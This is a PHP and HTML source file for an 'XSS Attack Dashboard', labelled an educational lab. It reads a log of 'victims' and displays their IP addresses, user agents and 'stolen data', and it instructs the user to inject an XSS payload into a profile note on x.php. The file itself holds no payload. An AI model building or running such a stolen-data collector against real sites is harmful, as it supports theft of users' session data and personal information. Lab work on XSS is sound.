<?php
// dashboard.php - Versiune simplificată care citește victims_log.json
$logFile = 'victims_log.json';
$victims = [];

if (file_exists($logFile)) {
    $content = file_get_contents($logFile);
    $victims = json_decode($content, true) ?: [];
}

// Sortează după timestamp
usort($victims, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});

$totalVictims = count($victims);
$todayVictims = 0;
foreach ($victims as $victim) {
    if (date('Y-m-d', strtotime($victim['timestamp'])) == date('Y-m-d')) {
        $todayVictims++;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🕵️ XSS Attack Dashboard</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .header { text-align: center; border: 2px solid #00ff00; padding: 20px; margin-bottom: 20px; }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; }
        .stat { background: rgba(255,0,0,0.1); border: 1px solid #ff0000; padding: 15px; text-align: center; flex: 1; }
        .stat-number { font-size: 2em; color: #ff0000; }
        .victim-card { background: rgba(255,0,0,0.1); border: 1px solid #ff0000; margin: 10px 0; padding: 15px; }
        .victim-header { color: #ff0000; font-weight: bold; margin-bottom: 10px; }
        .data-section { background: rgba(0,0,0,0.5); padding: 10px; margin: 5px 0; border-radius: 4px; }
        .warning { background: #333; color: #ffff00; padding: 15px; text-align: center; margin-bottom: 20px; }
        .no-data { text-align: center; color: #666; padding: 40px; }
        .refresh-btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕵️ XSS ATTACK DASHBOARD</h1>
        <p>Monitoring stolen data from x.php</p>
    </div>
    
    <div class="warning">
        ⚠️ EDUCATIONAL LAB - XSS Attack Monitoring
    </div>
    
    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Data</button>
    
    <div class="stats">
        <div class="stat">
            <div class="stat-number"><?php echo $totalVictims; ?></div>
            <div>Total Victims</div>
        </div>
        <div class="stat">
            <div class="stat-number"><?php echo $todayVictims; ?></div>
            <div>Today's Victims</div>
        </div>
        <div class="stat">
            <div class="stat-number"><?php echo file_exists($logFile) ? 'YES' : 'NO'; ?></div>
            <div>Log File Exists</div>
        </div>
    </div>
    
    <div style="background: rgba(0,0,0,0.8); border: 1px solid #00ff00; padding: 20px;">
        <h2>🎯 Recent Victims</h2>
        
        <?php if (empty($victims)): ?>
            <div class="no-data">
                No victims captured yet.<br>
                <strong>Next steps:</strong><br>
                1. Go to x.php and login<br>
                2. Inject XSS payload in Profile Note<br>
                3. Refresh this page to see results
            </div>
        <?php else: ?>
            <?php foreach ($victims as $index => $victim): ?>
                <div class="victim-card">
                    <div class="victim-header">
                        🎯 <?php echo htmlspecialchars($victim['victim_id'] ?? 'Unknown'); ?> 
                        - ⏰ <?php echo htmlspecialchars($victim['timestamp'] ?? 'Unknown time'); ?>
                    </div>
                    
                    <div class="data-section">
                        <strong>🌐 Network Info:</strong><br>
                        IP: <?php echo htmlspecialchars($victim['ip'] ?? 'Unknown'); ?><br>
                        Method: <?php echo htmlspecialchars($victim['method'] ?? 'Unknown'); ?><br>
                        User Agent: <?php echo htmlspecialchars(substr($victim['user_agent'] ?? 'Unknown', 0, 100)); ?>...
                    </div>
                    
                    <?php if (isset($victim['get_data']) && !empty($victim['get_data'])): ?>
                        <div class="data-section">
                            <strong>📥 GET Data:</strong><br>
                            <?php echo htmlspecialchars(json_encode($victim['get_data'], JSON_PRETTY_PRINT)); ?>
                        </div>
                    <?php endif; ?>
                    
                    <?php if (isset($victim['stolen_data']) && !empty($victim['stolen_data'])): ?>
                        <div class="data-section">
                            <strong style="color: #ff4444;">💰 STOLEN DATA:</strong><br>
                            <pre style="color: #ff4444; font-size: 0.9em; max-height: 200px; overflow-y: auto;"><?php echo htmlspecialchars(json_encode($victim['stolen_data'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)); ?></pre>
                        </div>
                    <?php endif; ?>
                    
                    <?php if (isset($victim['raw_input']) && !empty($victim['raw_input'])): ?>
                        <div class="data-section">
                            <strong>📄 Raw Input:</strong><br>
                            <pre style="font-size: 0.8em; max-height: 100px; overflow-y: auto;"><?php echo htmlspecialchars($victim['raw_input']); ?></pre>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
    
    <div style="text-align: center; margin-top: 20px; color: #666;">
        <p>Log file: <?php echo $logFile; ?> (<?php echo file_exists($logFile) ? filesize($logFile) . ' bytes' : 'not found'; ?>)</p>
        <p>Auto-refresh every 10 seconds</p>
    </div>
    
    <script>
        setTimeout(function() { location.reload(); }, 10000);
    </script>
</body>
</html>